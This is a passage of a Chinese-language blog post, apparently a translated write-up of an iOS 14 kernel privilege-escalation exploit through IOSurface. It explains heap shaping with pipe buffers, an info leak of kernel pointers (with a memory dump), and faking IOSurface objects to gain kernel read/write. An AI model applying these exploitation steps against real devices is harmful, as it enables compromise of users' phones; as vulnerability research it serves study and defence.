buffer,</span></span><br><span class="line"><span class="comment">     * even if the system pipe buffer high-water mark has been crossed.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">assert</span>(PIPE_BUF == pipesize_blocks[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (expected &gt; current) &#123;</span><br><span class="line">        target = expected;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        target = current;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (i &gt; <span class="number">0</span> &amp;&amp; pipesize_blocks[i - <span class="number">1</span>] &gt; target) &#123;</span><br><span class="line">        i = i - <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> pipesize_blocks[i];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当你使用管道系统调用创建一个管道时，在你向其写入之前，不会为支持的管道缓冲区分配内存。第一次写入的大小首先决定了管道缓冲区的分配量有多大。这正是select_pipespace的作用，pipesize_blocks列出了可能的分配大小。但PIPE_SIZE是什么？</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Pipe buffer size, keep moderate in value, pipes take kva space.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> PIPE_SIZE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PIPE_SIZE       16384</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>

<p>pipesize_blocks的最后一个int是16384 * 4，即0x10000。因此，我们需要做的就是直接从内核地图中分配一个管道缓冲区，并向它写入0x10000字节。</p>
<p>因此，前面提到的 “可预测的布局”，将仅仅是并排的0x10000字节的IOSurfaceClient数组和管道缓冲区。一旦我们在我们拥有的某个IOSurfaceRootUserClient对象中提高了surface_client_array_capacity，那么无论这个容量对应的IOSurfaceClient数组后面的管道缓冲区是什么，我们都会被控制在越界读取的缓冲区。</p>
<p>为了让0x10000字节的IOSurfaceClient数组和管道缓冲区并排使用，我们所要做的就是释放大量的空间，然后交替分配0x10000字节的IOSurfaceClient数组和管道缓冲区。对于 “大量的空间”，使用锚点分配左侧的16MB。为什么是左边的16MB？实验得出来的。</p>
<p>在第一阶段结束时，锚点分配左侧的16MB将看起来像这样。</p>
<p><img src="https://jsherman212.github.io/assets/popping_ios14_with_iomfb/stage1_16mb.png"></p>
<h2 id="Stage-2-信息泄露"><a href="#Stage-2-信息泄露" class="headerlink" title="Stage 2: 信息泄露"></a>Stage 2: 信息泄露</h2><p>除了在偏移量0x40处携带一个指向它所管理的IOSurface对象的指针外，它还在偏移量0x10处携带一个指向拥有该Surface的IOSurfaceRootUserClient对象的指针。我们将在前面显示的IOSurface关系图中给IOSurfaceClient添加这个字段。</p>
<p><img src="https://jsherman212.github.io/assets/popping_ios14_with_iomfb/iosurface_bigger_picture_stage2.png"></p>
<p>大多数IOSurfaceRootUserClient外部方法都遵循这种模式:</p>
<ul>
<li>从IOSurfaceRootUserClient中读取IOSurfaceClient数组。</li>
<li>用用户空间的IOSurface ID索引到该数组中的一个IOSurfaceClient对象。</li>
<li>将IOSurfaceClient中的IOSurface指针传递给一个为该外部方法做工作的函数。</li>
</ul>
<p>如果步骤3中的IOSurface指针指向一个IOSurfaceRootUserClient，会怎么样？那些旨在从该Surface返回字段的外部方法会不会无意中泄露该用户客户端的有价值的字段？</p>
<p>第一阶段在塑造了内核的地址空间之后，实际上还做了一些工作：它将喷射大量的IOSurfaceClient对象，以创建一堆只有这些对象的页面。这样一来，对于一个任意的IOSurface ID，其对应的IOSurfaceClient与其他IOSurfaceClient对象相邻的机会就非常大了。而从现在开始，将把两个相邻的IOSurfaceClient对象称为 “一对”，其中一个在左边，另一个在右边。</p>
<p>现在我们使用重叠策略应用于其中一个对。因为没有办法知道一个surface ID是否会对应于一个对的左边，所以将做一个有根据的猜测。如果猜对了，就会有这样的东西，数组中的蓝色IOSurfaceClient指针指向左边的那个。</p>
<p><img src="https://jsherman212.github.io/assets/popping_ios14_with_iomfb/iosurface_bigger_picture_stage2_adjacent.png"></p>
<p>我们的想法是让内核在读取左边的IOSurfaceClient时，从左边的IOSurfaceClient的末端读到右边的IOSurfaceClient上。因为我们可以推导出surface客户端数组的地址，因为它与锚点分配器非常接近，我们将通过增加左边数组中的指针来实现这一目的。</p>
<ul>
<li>offsetof(IOSurfaceClient, IOSurface)是0x40</li>
<li>offsetof(IOSurfaceClient, IOSurfaceRootUserClient) 是0x10</li>
<li>每个IOSurfaceClient对象占用0xa0字节，因为它们住在kext.kalloc.160中。</li>
</ul>
<p>从左边的surface字段到它所在的kext.kalloc.160元素的末端的距离是0xa0-0x40，或者0x60字节。但这只是与左边的IOSurface字段重叠，只够读取右边的vtable指针的偏移量0x0，所以我们需要一个额外的0x10字节来读取右边的IOSurfaceRootUserClient字段。因此，我们将用32位递增原语将左边的指针递增0x70字节。之后，它将指向左边的一半多一点。</p>
<p><img src="https://jsherman212.github.io/assets/popping_ios14_with_iomfb/iosurface_bigger_picture_stage2_adjacent_overlap.png"></p>
<p>如果我们猜测的表面ID是错误的，那么在这一点上我们很快就会导致Panic，但如果它是正确的，我们现在可以通过使用与左边对应的表面ID从拥有的IOSurfaceRootUserClient中读取字节。对把IOSurfaceRootUserClient的外部方法当作黑匣子来看待，看到了很多乐趣，但没有什么能让准备好在调用IOSurfaceRootUserClient外部方法28，或者IOSurfaceRootUserClient::s_get_bulk_attachments之后，在0x80字节的结构输出中看到的东西。下面是部分内存转储:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0x16eea33f8: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">0x16eea3408: 00 00 00 00 AO 5C A2 CB E4 FF FF FF 00 F8 10 CC</span><br><span class="line">0x16eea3418: E4 FF FF FF 01 00 00 00 00 00 00 00 80 B2 7F 9A</span><br><span class="line">0x16eea3428: E1 FF FF FF 00 00 00 00 00 00 00 00 28 FB 13 CB</span><br><span class="line">0x16eea3438: E4 FF FF FF E0 A4 A4 CC E4 FF FF FF F8 A4 A4 CC</span><br><span class="line">0x16eea3448: E4 FF FF FF 00 40 3A E7 E8 FF FF FF 00 20 00 00</span><br><span class="line">0x16eea3458: 00 00 00 00 40 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">0x16eea3468: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br></pre></td></tr></table></figure>

<p>该缓冲区包括许多内核指针，但我们感兴趣的是指向:</p>
<ul>
<li>一个IOSurfaceRoot对象，在偏移量0x1c。</li>
<li>一个我们拥有的IOSurfaceRootUserClient对象，在偏移量0x3c。</li>
<li>属于IOSurfaceRootUserClient的IOSurfaceClient数组，在偏移量0x54。<ul>
<li>该数组的容量（除以sizeof(IOSurfaceClient *)）也在偏移量0x5c。</li>
</ul>
</li>
</ul>
<p>唯一的问题是IOSurfaceRootUserClient指针移位了0xf8字节，但这很简单，从它那里减去0xf8就可以得到原始指针。</p>
<h2 id="Stage-3-iOS14-7一个简单技巧"><a href="#Stage-3-iOS14-7一个简单技巧" class="headerlink" title="Stage 3: iOS14.7一个简单技巧"></a>Stage 3: iOS14.7一个简单技巧</h2><p>我们带着指向我们拥有的IOSurfaceRootUserClient对象及其IOSurfaceClient数组的指针进入第三阶段。但这不是普通的IOSurfaceClient数组–它是我们在第1阶段喷出的一个数组，所以在它旁边会有一个管道缓冲器。虽然我们不确定哪个管道缓冲区就在旁边，但我们可以通过在泄露的IOSurfaceClient数组指针上添加0x10000来得出它的地址。我们在第3阶段做的第一件事是以如下方式设置我们在第1阶段喷涂的所有管道缓冲区。</p>
<ul>
<li>偏移量0x0包含衍生的管道缓冲区地址，加上8。</li>
<li>偏移量0x8包含一个假的IOSurfaceClient对象。</li>
<li>偏移量0xa8包含一个假的IOSurface对象。<ul>
<li>假的IOSurface的偏移量0xc0指向管道缓冲区的某个地方，把它的索引写在包含第一阶段所有喷涂管道的数组中。这样做是为了以后能弄清哪个管道缓冲区里有我们的假对象。</li>
</ul>
</li>
</ul>
<p>现在所有的管道缓冲区都设置好了，使用32位的增量，将泄露的IOSurfaceRootUserClient对象的容量提高了一个。</p>
<p>为了弄清楚哪个拥有的IOSurfaceRootUserClient被损坏了，在所有的IOSurfaceRootUserClient::get_surface_use_count中循环查看，当调用IOSurfaceRootUserClient::get_surface_use_count的surface ID索引到相邻的管道缓冲区的开始时，除了错误之外，是否得到其他的东西。如果没有错误，就找到了被破坏的那个，四个字节的输出是持有假IOSurfaceClient和IOSurface对象的管道的索引。</p>
<p>现在我们已经控制了一个IOSurface对象，我们可以用第0阶段谈到的外部方法设置任意的内核读写API。 这样，手机就被攻陷了，我们可以开始越狱。</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这篇文章里的exp不是一个完整的越狱，而且，exp代码也有限制。</p>

    </div>

    
    
    

    <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/ios/" rel="tag"># ios</a>
              <a href="/tags/LPE/" rel="tag"># LPE</a>
              <a href="/tags/IOServices/" rel="tag"># IOServices</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2021/12/06/Chrome-CVE-2020-6449-UAF/" rel="prev" title="Chrome CVE-2020-6449 UAF">
                  <i class="fa fa-angle-left"></i> Chrome CVE-2020-6449 UAF
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2021/12/11/iOS%E5%86%85%E6%A0%B8%E5%87%BD%E6%95%B0Hook%E6%A1%86%E6%9E%B6-xnuspy/" rel="next" title="iOS内核函数Hook框架 - xnuspy">
                  iOS内核函数Hook框架 - xnuspy <i class="fa fa-angle-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="copyright">
    &copy; 
    <span itemprop="copyrightYear">2024</span>
    <span class="with-love">
      <i class="fa fa-heart"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">buffer0verflooow</span>
  </div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a>
  </div>

    </div>
  </footer>

  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>
  <div class="sidebar-dimmer"></div>
  <div class="back-to-top" role="button" aria-label="Back to top">
    <i class="fa fa-arrow-up fa-lg"></i>
    <span>0%</span>
  </div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script>

  






  





</body>
</html>
